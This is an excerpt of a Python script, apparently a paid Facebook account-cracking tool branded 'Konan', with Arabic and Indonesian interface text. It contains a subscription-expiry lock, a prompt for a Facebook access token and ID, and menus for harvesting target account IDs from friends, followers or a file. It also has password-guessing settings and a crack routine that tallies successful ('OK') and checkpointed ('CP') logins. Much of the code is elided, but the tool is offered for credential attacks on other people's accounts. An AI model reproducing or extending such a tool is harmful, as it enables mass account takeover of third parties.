...
g= datetime.datetime(2023, 11, 3, 0 , 0 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("     "+'تم توقيف الاداة راسل المبرمج كونان لتفعيلها @KO00NAN / https://t.me/Iraqimothr')
 print('\n\n')
 print(x)
...
if (x.strftime("%x"))==(g.strftime("%x")):
   ...
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("     "+'خلص اشتراك عليك مراجعة صانع الاداة @KO00NAN / https://t.me/Iraqimothr☄️🗿')
    print('\n\n')
    print(x)
...
output = render('KONAN', colors=['white', 'red'], align='center')
print(output)
print(f'''\033[2;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mDEVELOPER  :  المطور كونان
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mMY CHANNEL : @KO00NAN
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mTOOL       : اداة صيد فيس كونان المدفوعة
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mTELEGRAM   : @Haker aldola
\033[2;35m\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
print('\n')
token=input(f'{Y} [{Y}+{Y}] {B}𝙏𝙊𝙆𝙀𝙉 ➪  ' + F)
print('\n')
ID=input(f'{Y} [{Y}+{Y}] {B}𝙄𝘿 ➪ ' + F)
os.system('clear')
...
def menu(my_name,my_id):
	...
	print(Z+'\x1b[38;5;208mTelegram ᯼ @@V_VZ_VZ  ')
	print(F+          'اداه الفيس المدفوعة')
	print(C+'  ━━━━━━━━━━━━━━━━━━  ')
	print(f'{A}  𝐘𝐎𝐔𝐑 𝐈𝐃 ➪  {F}'+str(my_id))
	print(f'{A}  𝐘𝐎𝐔𝐑 𝐈𝐏 ➪  {F}{ip}')
	print(C+'  ━━━━━━━━━━━━━━━━━━  ')
	print('')
	print('\033[2;34m 1- Fishing from friends ➪ \033[2;32mمن الاصدقاء  ')
	print(C+'  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  ')
	print('\033[2;34m 2- Fishing from followers ➪\033[2;32mمن المتابعين ')
	print(C+'  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  ')
	print('\033[2;34m 3- Crack File ➪\033[2;32mمــن مــلــف  ')
	print(C+'  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  ')		
	print('\033[2;34m 0- login out ➪\033[2;32mتسجيل خروج  ')
	print(C+'  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  ')
...
def follower():
	try:
		...
		exit()
	try:
		jum = int(input('\x1b[38;5;210m[♔︎]{X} 𝐂𝐑𝐀𝐂𝐊 𝐈𝐃 𝐋𝐈𝐌𝐈𝐓 ➪ اكتب عدد الايديات '))
	except ValueError:
	...
	for userr in uid:
		try:
			...
			print('[♔︎]{A} 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃 ➪ {F}'+str(len(id)))
			setting()
		except requests.exceptions.ConnectionError:
			print('[✖] No Connection  ')
			exit()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('\x1b[38;5;210m 𝐍𝐔𝐌𝐁𝐄𝐑 𝐈𝐃 | عدد الايديات ➪ '))
	except ValueError:
	...
	try:
		print('')
		print(Ah+'  ━━━━━━━━━━━━━━━━━━  ')
		print(f'» 𝐈𝐃 | عدد الايديات {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal Loh Kurang Bagus ')
...
def setting():
	...
	if hu in ['1','01']:
		...
		exit()
	print('\033[1;34m 1. 𝐌𝐎𝐁𝐈𝐋𝐄 ')
#    print('>> 2. Mbasic ')
#    print('>> 3. Touch  ')
#    print('>> 4. Mtouch ')
	print('')
	hc = input('\033[1;33m 𝐂𝐇𝐎𝐒𝐄 ➪ ')
	if hc in ['1','01']:
...
#		method.append('touch')
		...
		method.append('mobile')
	print('')
	_jembot_ = input('\033[2;32m 𝐀𝐃𝐃 𝐀𝐏𝐏 : اظهار التطبيقات المرتبطه ( Y/t ) ')
	if _jembot_ in ['']:
		...
		taplikasi.append('no')
	pwplus=input('\033[2;32m 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝐌𝐀𝐍𝐔𝐀𝐋 ➪ باسورد يدوي (T عشوائي)( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s <𝙼𝙸𝙺𝙴𝚈👑> %s/%s » [OK] %s » [CP] %s » %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
